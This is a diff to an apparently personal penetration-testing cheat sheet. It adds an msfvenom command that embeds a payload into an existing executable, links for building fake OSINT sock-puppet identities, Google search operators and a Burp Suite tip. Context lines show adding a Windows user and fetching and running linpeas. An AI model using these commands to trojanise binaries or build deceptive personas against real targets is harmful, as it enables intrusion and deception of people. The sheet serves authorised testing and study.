@@ -47,6 +47,10 @@ run scheduletaskabuse
 ```
 net user <user> <pass> /add
 ```
+**MSFVenom**
+```
+msfvenom -a <arch> --platform <os> -x <name>.<ext> -k -p windows/messagebox lhost=<ip> -b "\x00" -f exe -o <final_name>.<ext>
+```
 ## Pivoting
 
 SSH proxy through a compromised machine
@@ -122,3 +126,43 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux
 chmod +x linpeas_linux_amd64
 ./linpeas_linux_amd64
 ```
+
+### Sock Puppets
+
+Creating an Effective Sock Puppet for OSINT Investigations – Introduction - [https://web.archive.org/web/20210125191016/https://jakecreps.com/2018/11/02/sock-puppets/](https://web.archive.org/web/20210125191016/https://jakecreps.com/2018/11/02/sock-puppets)
+
+The Art Of The Sock - [https://www.secjuice.com/the-art-of-the-sock-osint-humint/](https://www.secjuice.com/the-art-of-the-sock-osint-humint/)
+
+Reddit - My process for setting up anonymous sockpuppet accounts - [https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/](https://www.reddit.com/r/OSINT/comments/dp70jr/my_process_for_setting_up_anonymous_sockpuppet/)
+
+Fake Name Generator - [https://www.fakenamegenerator.com/](https://www.fakenamegenerator.com/)
+
+This Person Does not Exist - [https://www.thispersondoesnotexist.com/](https://www.thispersondoesnotexist.com/)
+
+Privacy.com - [https://privacy.com/join/LADFC](https://privacy.com/join/LADFC) - *Referral link. We each get $5 credit on sign up.
+
+### Search Engine Operators
+```
+site:<url>
+```
+```
+"<text>"
+```
+```
+AND
+```
+```
+filetype:<ext>
+```
+```
+-<not text>
+```
+```
+intext:<string>
+```
+Google Advanced Search
+
+
+## MISC
+In BurpSuite you can "Limit Scope" in proxy settings to allow use of accessing other pages while burp is on
+![[../Pasted image 20250508181510.png]]
